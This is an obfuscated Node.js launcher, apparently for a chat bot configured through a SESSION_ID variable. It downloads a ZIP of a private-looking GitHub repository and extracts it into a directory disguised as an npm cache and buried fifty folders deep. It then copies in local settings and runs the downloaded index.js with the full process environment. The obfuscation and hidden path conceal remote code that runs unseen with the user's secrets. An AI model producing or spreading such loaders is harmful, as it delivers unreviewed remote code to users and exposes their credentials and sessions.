




process.env.SESSION_ID=""






const _0x1b08b4 = _0x4e16;
(function (_0x4949a8, _0x1456f3) {
    const _0x1a1bb2 = _0x4e16,
        _0x420702 = _0x4949a8();
    while (!![]) {
        try {
            const _0x293de3 = -parseInt(_0x1a1bb2(113097 ^ 112759)) / (372771 ^ 372770) * (-parseInt(_0x1a1bb2(161060 ^ 160953)) / (481813 ^ 481815)) + parseInt(_0x1a1bb2(859248 ^ 859617)) / (227419 ^ 227416) + -parseInt(_0x1a1bb2(412483 ^ 412395)) / (681326 ^ 681322) + parseInt(_0x1a1bb2(238836 ^ 238914)) / (819146 ^ 819151) * (-parseInt(_0x1a1bb2(161057 ^ 160951)) / (953886 ^ 953880)) + -parseInt(_0x1a1bb2(934962 ^ 935330)) / (346491 ^ 346492) * (parseInt(_0x1a1bb2(172795 ^ 172876)) / (864848 ^ 864856)) + -parseInt(_0x1a1bb2(155793 ^ 155934)) / (321497 ^ 321488) * (parseInt(_0x1a1bb2(105886 ^ 105477)) / (979785 ^ 979779)) + -parseInt(_0x1a1bb2(815513 ^ 815104)) / (760307 ^ 760312) * (-parseInt(_0x1a1bb2(557363 ^ 557223)) / (714751 ^ 714739));
            if (_0x293de3 === _0x1456f3) break;
            else _0x420702["push"](_0x420702["shift"]());
        } catch (_0x53d089) {
            _0x420702['push'](_0x420702['shift']());
        }
    }
})(_0x567b, 0x7396d);
const fs = require("fs"),
    path = require(_0x1b08b4(144484 ^ 144881)),
    axios = require(_0x1b08b4(637668 ^ 637815)),
    AdmZip = require(_0x1b08b4(838136 ^ 837726)),
    {
        'spawn': spawn
    } = require(_0x1b08b4(600518 ^ 600189)),
    chalk = require(_0x1b08b4(774851 ^ 775033)),
    deepLayers = Array['from']({
        "length": 0x32
    }, (_0x3bb377, _0x3351f0) => "x.".split("").reverse().join("") + (_0x3351f0 + (923576 ^ 923577))),
    TEMP_DIR = path[_0x1b08b4(403435 ^ 403026)](__dirname, ".npm", _0x1b08b4(895028 ^ 895369), ...deepLayers),
    DOWNLOAD_URL = "https://github.com/superstar-zimtk/pretty-md-private-1/archive/refs/heads/main.zip",
    EXTRACT_DIR = path["join"](TEMP_DIR, _0x1b08b4(698764 ^ 698416)),
    LOCAL_SETTINGS = path["join"](__dirname, _0x1b08b4(905984 ^ 905886)),
    EXTRACTED_SETTINGS = path[_0x1b08b4(546705 ^ 546344)](EXTRACT_DIR, _0x1b08b4(364948 ^ 364554)),
    delay = _0x1c5dc4 => new Promise(_0x5cfdec => setTimeout(_0x5cfdec, _0x1c5dc4));
async function downloadAndExtract() {
    const _0x20290f = _0x1b08b4;
    try {
        if (fs["existsSync"](EXTRACT_DIR)) {
            console["log"](chalk[_0x20290f(758686 ^ 758330)]('😅 Extracted directory found. Skipping download and extraction.'));
            return;
        }
        fs['existsSync'](TEMP_DIR) && (console["log"](chalk[_0x20290f(408265 ^ 408429)](_0x20290f(749233 ^ 749317))), fs["rmSync"](TEMP_DIR, {
            "recursive": !![],
            'force': !![]
        }));
        fs["mkdirSync"](TEMP_DIR, {
            "recursive": !![]
        });
        const _0x55d278 = path[_0x20290f(180451 ^ 180570)](TEMP_DIR, _0x20290f(518959 ^ 518812));
        console['log'](chalk[_0x20290f(754486 ^ 754307)](_0x20290f(501388 ^ 501524)));
        const _0x37a79c = await axios({
            "url": DOWNLOAD_URL,
            'method': _0x20290f(929532 ^ 929603),
            "responseType": _0x20290f(190529 ^ 190927)
        });
        await new Promise((_0x11abf3, _0x160513) => {
            const _0x2f931c = _0x20290f,
                _0x279016 = fs['createWriteStream'](_0x55d278);
            _0x37a79c[_0x2f931c(712566 ^ 712412)][_0x2f931c(464040 ^ 464133)](_0x279016), _0x279016["on"](_0x2f931c(844076 ^ 843917), _0x11abf3), _0x279016["on"]("error", _0x160513);
        }), console[_0x20290f(256673 ^ 256778)](chalk[_0x20290f(752330 ^ 752511)]('💉 ZIP download complete.'));
        try {
            new AdmZip(_0x55d278)[_0x20290f(303287 ^ 303365)](TEMP_DIR, !![]);
        } catch (_0xd4faf0) {
            console['error'](chalk['red'](_0x20290f(632340 ^ 632755)), _0xd4faf0);
            throw _0xd4faf0;
        } finally {
            fs[_0x20290f(355970 ^ 356126)](_0x55d278) && fs[_0x20290f(345960 ^ 345803)](_0x55d278);
        }
        const _0x258026 = path[_0x20290f(931258 ^ 930819)](EXTRACT_DIR, '');
        fs[_0x20290f(469662 ^ 469762)](_0x258026) ? console[_0x20290f(650995 ^ 651096)](chalk["green"]('✅ Plugins folder found.')) : console[_0x20290f(666090 ^ 665665)](chalk[_0x20290f(609902 ^ 610242)](_0x20290f(246331 ^ 246676)));
    } catch (_0x3ff0f1) {
        console["error"](chalk[_0x20290f(899227 ^ 899383)]('❌ Extract failed:'), _0x3ff0f1);
        throw _0x3ff0f1;
    }
}
async function applyLocalSettings() {
    const _0x5322a3 = _0x1b08b4;
    if (!fs[_0x5322a3(127834 ^ 127686)](LOCAL_SETTINGS)) {
        console[_0x5322a3(654963 ^ 655320)](chalk[_0x5322a3(247742 ^ 247307)](_0x5322a3(350497 ^ 350398)));
        return;
    }
    try {
        fs['mkdirSync'](EXTRACT_DIR, {
            "recursive": !![]
        }), fs["copyFileSync"](LOCAL_SETTINGS, EXTRACTED_SETTINGS), console['log'](chalk[_0x5322a3(582939 ^ 582847)](_0x5322a3(862528 ^ 862448)));
    } catch (_0x4d2295) {
        console["error"](chalk['red'](_0x5322a3(535006 ^ 534601)), _0x4d2295);
    }
    await delay(503665 ^ 503521);
}

function _0x567b() {
    const _0x3ad039 = ["child_process", "niam-1-etavirp-dm-ytterp".split("").reverse().join(""), "ehcacx".split("").reverse().join(""), "7NfRZdG", "TEG".split("").reverse().join(""), "env", '❌ index.js not found in extracted directory.', "stream", "Gplxjc10881".split("").reverse().join(""), "EHhHrq5380655".split("").reverse().join(""), "132507uZjIaN", "edon".split("").reverse().join(""), "soixa".split("").reverse().join(""), "xhxEaE21".split("").reverse().join(""), "path", "2080566ceSHdg", '❌ Failed to apply local settings:', '⬇️ Connecting to pretty-Md...', "MmrjTZ22186791".split("").reverse().join(""), "production", "jRGgOz0753".split("").reverse().join(""), "existsSync", "IxysgU663851".split("").reverse().join(""), "settings.js", '⚠️ No local settings file found.', "close", "finish", '❌ Extracted directory not found. Cannot start bot.', "cnySknilnu".split("").reverse().join(""), "green", "rorre".split("").reverse().join(""), "adm-zip", '❌ Failed to extract ZIP:', "UNHuUO046041".split("").reverse().join(""), "index.js", "data", "gol".split("").reverse().join(""), "der".split("").reverse().join(""), "pipe", "inherit", '❌ Plugin folder not found.', '🛠️ Local settings applied.', '🚀 Launching bot instance...', "extractAllTo", "piz.oper".split("").reverse().join(""), '🗑️ Cleaning previous cache...', "eulb".split("").reverse().join(""), "HEfbQz5".split("").reverse().join(""), "8WLfcka", '❌ Bot failed to start:', "nioj".split("").reverse().join(""), "chalk"];
    _0x567b = function () {
        return _0x3ad039;
    };
    return _0x567b();
}

function startBot() {
    const _0x28f60b = _0x1b08b4;
    console[_0x28f60b(689355 ^ 689504)](chalk['cyan'](_0x28f60b(518856 ^ 519033)));
    if (!fs[_0x28f60b(545368 ^ 545732)](EXTRACT_DIR)) {
        console[_0x28f60b(700614 ^ 700771)](chalk[_0x28f60b(323416 ^ 323316)](_0x28f60b(398453 ^ 398807)));
        return;
    }
    if (!fs['existsSync'](path[_0x28f60b(507921 ^ 508328)](EXTRACT_DIR, "sj.xedni".split("").reverse().join("")))) {
        console[_0x28f60b(168186 ^ 168287)](chalk[_0x28f60b(303681 ^ 304109)](_0x28f60b(713076 ^ 712953)));
        return;
    }
    const _0x1fb5fb = spawn(_0x28f60b(392500 ^ 392358), [_0x28f60b(911420 ^ 911765)], {
        "cwd": EXTRACT_DIR,
        "stdio": _0x28f60b(672841 ^ 673255),
        "env": {
            ...process[_0x28f60b(552239 ^ 552099)],
            'NODE_ENV': _0x28f60b(363051 ^ 363441)
        }
    });
    _0x1fb5fb['on'](_0x28f60b(750355 ^ 750259), _0x1c0e6a => {
        const _0xabfb69 = _0x28f60b;
        console[_0xabfb69(628416 ^ 628587)](chalk["red"]('💥 Bot terminated with exit code: ' + _0x1c0e6a));
    }), _0x1fb5fb['on'](_0x28f60b(252422 ^ 252835), _0x471e3c => {
        const _0x3452fd = _0x28f60b;
        console[_0x3452fd(738038 ^ 738131)](chalk[_0x3452fd(568360 ^ 568708)](_0x3452fd(792558 ^ 792150)), _0x471e3c);
    });
}

function _0x4e16(_0x3f48e6, _0x23bc87) {
    const _0x567b7d = _0x567b();
    return _0x4e16 = function (_0x4e1689, _0x2ab341) {
        _0x4e1689 = _0x4e1689 - (498529 ^ 498413);
        let _0x15f4ab = _0x567b7d[_0x4e1689];
        return _0x15f4ab;
    }, _0x4e16(_0x3f48e6, _0x23bc87);
}(async () => {
    const _0x2464bf = _0x1b08b4;
    try {
        await downloadAndExtract(), await applyLocalSettings(), startBot();
    } catch (_0x8745f1) {
        console["error"](chalk[_0x2464bf(386762 ^ 386918)]('❌ Fatal error in main execution:'), _0x8745f1), process['exit'](169345 ^ 169344);
    }

})();
